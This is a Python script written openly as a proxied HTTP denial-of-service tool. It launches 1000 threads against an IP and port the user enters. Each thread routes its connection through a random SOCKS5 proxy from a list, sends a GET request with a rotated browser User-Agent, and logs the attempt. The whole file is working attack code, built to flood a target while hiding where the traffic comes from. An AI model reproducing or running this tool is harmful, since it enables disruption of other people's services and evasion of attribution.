import threading
import socket
import socks
import random
import time

F = '\033[91m'
E = '\033[0m'

stop_flag = False  # Флаг для остановки программы

def dos(ip, port, proxies_file, log_file):
    global stop_flag
    try:
        with open(proxies_file, 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()
            proxy_host, proxy_port = proxy.split(':')

            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)  # Timeout for connection
            s.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))  # Specify SOCKS version and proxy details
            s.connect((ip, int(port)))
            print(F + time.ctime(time.time()) + ' Connected to proxy: ' + proxy + E)

            agent = []
            agent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
            agent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
            agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
            agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")

            s.sendall(f'GET http://{ip}:{port} HTTP/1.1\r\n'.encode())
            s.sendall(f'User-Agent: {random.choice(agent)}\r\n'.encode())
            s.sendall('\r\n'.encode())

            with open(log_file, 'a') as log:
                log.write(f"{time.ctime(time.time())} Request sent to {ip}:{port} via proxy {proxy}\n")

            s.close()
    except Exception as e:
        with open(log_file, 'a') as log:
            log.write(f"{time.ctime(time.time())} Error: {str(e)}\n")

def main():
    global stop_flag
    ip = input("Enter the IP address: ")
    port = input("Enter the port: ")
    proxies_file = "proxy.txt"
    log_file = "log.txt"

    threads = []

    for _ in range(1000):
        t = threading.Thread(target=dos, args=(ip, port, proxies_file, log_file))
        threads.append(t)
        t.start()

    while True:
        command = input("Enter 'stop' to stop the program: ")
        if command.lower() == 'stop':
            stop_flag = True
            break

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
